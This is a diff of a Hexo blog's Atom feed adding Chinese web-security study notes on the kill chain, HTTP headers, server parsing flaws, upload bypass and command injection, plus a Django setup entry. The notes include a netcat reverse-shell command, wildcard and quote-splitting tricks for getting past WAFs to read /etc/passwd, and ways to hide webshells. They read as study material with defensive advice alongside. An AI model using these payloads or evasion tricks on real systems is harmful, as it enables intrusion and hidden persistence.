@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-06-19T14:24:03.773Z</updated>
+  <updated>2020-06-24T15:25:50.447Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>notebook</title>
+    <link href="http://yoursite.com/2020/06/24/notebook/"/>
+    <id>http://yoursite.com/2020/06/24/notebook/</id>
+    <published>2020-06-24T11:44:37.000Z</published>
+    <updated>2020-06-24T15:25:50.447Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="攻击连模型"><a href="#攻击连模型" class="headerlink" title="攻击连模型"></a>攻击连模型</h1><pre><code>侦察目标：充分利用社会工程学了解目标网络制作工具：输送制作的定向攻击工具比如 带有恶意代码的文件传送工具：输送工具到目标的系统上触发工具：利用目标系统的应用或者操作系统漏洞，在目标系统触发工具工具运行安装木马：远程控制程序的安装，使攻击者可以长期潜伏在目标系统中建立连接 与互联网控制服务器建立c2通道执行攻击：执行所需要的攻击行为 例如偷取信息 篡改信息</code></pre><h1 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h1><p>1http请求：http请求包括 请求行 请求头 请求正文<br>2http响应：与http请求对应的是http响应，http响应也是由三部分组成，分别是响应行，响应头，和响应正文</p><h1 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h1><pre><code>1xx 提示信息，继续处理2xx 请求成功接受处理3xx 重定向4xx 客户端错误5xx 服务端错误</code></pre><h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><pre><code>HOST:用于指定请求的资源的internet主机和端口号User-agent：允许客户端将他的操作系统，浏览器和其他属性告诉服务器Referer：代表当前访问url的上一个urlCookie：一段文本 用来表示请求者的身份Range：多线程下载一定会用到这个请求头X-forward-for：他代表请求端的ip 可以有多个中间用逗号隔开Accept 用于指定客户端收那些mMIME类型的消息Accept-Charset：用于指定客户端接收的字符集</code></pre><h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><pre><code>serverr：服务器所使用web服务器的名词 避免攻击者探测可修改此头set-cookie：向客户端设置cookie Last-Modified:浏览器通过此头告诉浏览器最后资源修改时间Location：服务器告诉浏览器要去访问那个页面 配合302使用refresh 告诉浏览器定时刷新浏览器</code></pre><h1 id="实体头常用实体头"><a href="#实体头常用实体头" class="headerlink" title="实体头常用实体头"></a>实体头常用实体头</h1><pre><code>Content-Type 实体报头域用语指明发送给接收者的实体正文的媒体类型Content-Length 实体报头域用于指明实体正文的长度，以字节方式存储的十进制数字表示Last-Modified </code></pre><h6 id="防止sql注入办法-严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程"><a href="#防止sql注入办法-严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程" class="headerlink" title="防止sql注入办法 严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程"></a>防止sql注入办法 严格数据类型，特殊字符转义，预编译语句，框架技术，存储过程</h6><pre><code>1在服务端对所有输入数据有效性进行验证2在处理函数之前验证所有客户端提供的数据包括参数 url和http内容3验证数据类型 长度，以及合法性4使用白名单5危险字符后进行转义或者编码6避免使用动态拼接sql语句 </code></pre><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><h1 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h1><pre><code>1目录解析：在网站目录*.asp,*.asa下的任何扩展名的文件格式都会被解析成为asp并执行在目录*.asp文件下，*.txt，*.jpg,*png格式被解析成asp2文件解析：在iis6.0上 分号;后面的不解析3其他默认可执行文件格式</code></pre><h1 id="nginx-解析漏洞"><a href="#nginx-解析漏洞" class="headerlink" title="nginx 解析漏洞"></a>nginx 解析漏洞</h1><pre><code>php CGI解析漏洞在网站下建立xxx.jpg在浏览器访问http://xxx.jpg/xx.php   xxx.jpg服务器并没有意义反馈文件不存在而是请求拒绝 原因是在nginx中当发现xx.php不存在时 会去请求 xxx.jpg这就是nginx的畸形解析漏洞的利用方式空字节解析漏洞nginx在遇到00%空字节时与后端FastCGI处理不一致 导致可以把其他执行图片马http://xxxx/xx.jpg%00s.php会把他当做php来执行影响版本：nginx 0.5.*  nginx0.6.* nginx0.7&lt;=0.7.65 nginx0.8&lt;=0.8.37</code></pre><h1 id="apahce解析漏洞"><a href="#apahce解析漏洞" class="headerlink" title="apahce解析漏洞"></a>apahce解析漏洞</h1><pre><code>apache解析文件的时候是从右向左解析 比如 http://xxxxx/xx.php/xx.ras 无法解析ras 向左解析到.php </code></pre><h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><pre><code>客户端绕过服务端：文件类型，文件头，文件后缀名 配合文件包含漏洞配合服务器解析漏洞cms 编辑器漏洞绕过配合操作系统文件命名规则绕过配合其他规则绕过waf绕过</code></pre><h3 id="后门隐藏与维持技巧"><a href="#后门隐藏与维持技巧" class="headerlink" title="后门隐藏与维持技巧"></a>后门隐藏与维持技巧</h3><pre><code>运维寻找shell的方式：    通过文件名 修改时间大小 文件备份比对等    webshell扫描脚本    通过Access.log访问日志发现后门所在    waf拦截 警告日志1 404页面隐藏2 变形一句话3包含 （文件，图片，错误日志）4 混淆（代码层面） （修改文件时间，文件大小伪装处理）</code></pre><h1 id="文件上传修复建议"><a href="#文件上传修复建议" class="headerlink" title="文件上传修复建议"></a>文件上传修复建议</h1><pre><code>文件扩展名白名单校验文件内容服务端检验上传文件重命名隐藏上传路径</code></pre><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><pre><code>1代码过滤不严2系统的漏洞造成命令注入（bash破壳漏洞 CVE-2014-6271）3 调用第三方组件存在代码执行漏洞    比如 wordpass处理图片的mageMagick组件    java中的命令执行漏洞    thinkphp命令执行技巧1    ls -l 使用通配符 /?in/?s -l    /???/??t/??c/p???w? 有时候waf不允许太多?号 /?in/cat /?tc/p?sswd    nc反弹shell:    nc -e /bin/bash 127.0.0.1 3737 为了避免符号。可以将ip地址转换成整形 127.0.0.1-&gt;2130706433技巧2 连接符    echo &apos;h&apos;ell&apos;o&apos; 要注意闭合 利用这个可以绕过一些waf的检查    检测nc /&apos;b&apos;i&apos;n&apos;/&apos;w&apos;h&apos;i&apos;ch &apos;w&apos;g&apos;e&apos;t    其他字符 双引号 反斜杠 /b\i\n/w\h\i\c\h n\c技巧3 未初始化的变量cat$a /etc$a/passwd$a    防范建议1尽量少用执行命令函数或者禁用2参数尽量使用引号包括3使用动态函数之前，确保使用的函数是指定的函数之一4对执行命令的函数方法之前对参数进行严格过滤 对敏感字符进行转义5对php来说 不能完全控制的危险函数尽量不要用    </code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;攻击连模型&quot;&gt;&lt;a href=&quot;#攻击连模型&quot; class=&quot;headerlink&quot; title=&quot;攻击连模型&quot;&gt;&lt;/a&gt;攻击连模型&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;侦察目标：充分利用社会工程学了解目标网络
+制作工具：输送制作的定向攻击工具比如 带有恶意代码的文件
+
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>sqlmap</title>
@@ -90,15 +114,15 @@
     <link href="http://yoursite.com/2020/05/26/django/"/>
     <id>http://yoursite.com/2020/05/26/django/</id>
     <published>2020-05-26T15:31:48.000Z</published>
-    <updated>2020-06-10T13:25:40.048Z</updated>
+    <updated>2020-06-21T09:24:00.202Z</updated>
     
-    <content type="html"><![CDATA[<p>目录结构<br>    init.py：是一个python的包<br>    settings.py：项目的配置文件<br>    urls.py：路由配置文件<br>    wsgi.py：web服务器和Django交互入口<br>    manage.py:项目的管理文件<br>    ```bash</p><h2 id="django-创建命令-python-manage-py-startapp-app-name"><a href="#django-创建命令-python-manage-py-startapp-app-name" class="headerlink" title="django 创建命令 python manage.py startapp app-name"></a>django 创建命令 python manage.py startapp app-name</h2><pre><code>init.py：python模块 migrations：储存模型类迁移文件 admin.py：后台管理文件 models.py：和数据库交互模块 tests.py：测试代码文件 views.py：接受请求，处理，与M和T进行交互，返回应答，定义处理视图函数。</code></pre><p>修改 setting.py中的INSTALLED_APPS配置项，加上刚刚创建的应用程序</p><h2 id="启动程序：python-manage-py-runserver"><a href="#启动程序：python-manage-py-runserver" class="headerlink" title="启动程序：python manage.py runserver"></a>启动程序：python manage.py runserver</h2><h2 id="定义模型类，需要继承models-Model类"><a href="#定义模型类，需要继承models-Model类" class="headerlink" title="定义模型类，需要继承models.Model类"></a>定义模型类，需要继承models.Model类</h2><pre><code class="bash">from django.db import models</code></pre>]]></content>
+    <content type="html"><![CDATA[<h1 id="python创建虚拟环境"><a href="#python创建虚拟环境" class="headerlink" title="python创建虚拟环境"></a>python创建虚拟环境</h1><pre><code>使用清华源安装：pip install virtualenv -i https://pypi.python.org/simple/cd到存虚拟环境的地址    virtualenv -p /usr/local/bin/python2.7 ENV2 参数 -p 指定python版本创建虚拟环境virtualenv --system-site-packages ENV 参数 --system-site-packages 指定创建虚拟环境时继承系统三方库4. 激活/退出虚拟环境source bin/activate 激活虚拟环境pip list 查看当前虚拟环境下所安装的第三方库deactivate 退出虚拟环境删除虚拟环境：直接删除虚拟环境所在目录即可</code></pre><p>目录结构<br>    init.py：是一个python的包<br>    settings.py：项目的配置文件<br>    urls.py：路由配置文件<br>    wsgi.py：web服务器和Django交互入口<br>    manage.py:项目的管理文件</p><h2 id="启动django-python3-manage-py-runserver-8080"><a href="#启动django-python3-manage-py-runserver-8080" class="headerlink" title="启动django python3 manage.py runserver  8080"></a>启动django python3 manage.py runserver  8080</h2><pre><code>```bash</code></pre><h2 id="django-创建命令-python-manage-py-startapp-app-name"><a href="#django-创建命令-python-manage-py-startapp-app-name" class="headerlink" title="django 创建命令 python manage.py startapp app-name"></a>django 创建命令 python manage.py startapp app-name</h2><pre><code>init.py：python模块 migrations：储存模型类迁移文件 admin.py：后台管理文件 models.py：和数据库交互模块 tests.py：测试代码文件 views.py：接受请求，处理，与M和T进行交互，返回应答，定义处理视图函数。</code></pre><p>修改 setting.py中的INSTALLED_APPS配置项，加上刚刚创建的应用程序</p><h2 id="启动程序：python-manage-py-runserver"><a href="#启动程序：python-manage-py-runserver" class="headerlink" title="启动程序：python manage.py runserver"></a>启动程序：python manage.py runserver</h2><p>URL配置（URLconf）就像Django所支撑网站的目录。它的本质是URL与要为该URL调用的视图函数之间的映射表<br>urlpatterns = [url(r’^admin/‘, admin.site.urls),]<br>视图会返回一个HttpResponse对象，其中包含生成的响应。每个视图函数都负责返回一个HttpResponse对象。</p><h2 id="定义模型类，需要继承models-Model类"><a href="#定义模型类，需要继承models-Model类" class="headerlink" title="定义模型类，需要继承models.Model类"></a>定义模型类，需要继承models.Model类</h2><pre><code class="bash">from django.db import models</code></pre>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;目录结构&lt;br&gt;    init.py：是一个python的包&lt;br&gt;    settings.py：项目的配置文件&lt;br&gt;    urls.py：路由配置文件&lt;br&gt;    wsgi.py：web服务器和Django交互入口&lt;br&gt;    manage.py:项目的管理文
+        &lt;h1 id=&quot;python创建虚拟环境&quot;&gt;&lt;a href=&quot;#python创建虚拟环境&quot; class=&quot;headerlink&quot; title=&quot;python创建虚拟环境&quot;&gt;&lt;/a&gt;python创建虚拟环境&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;使用清华源安装：pip install vi
       
     
     </summary>
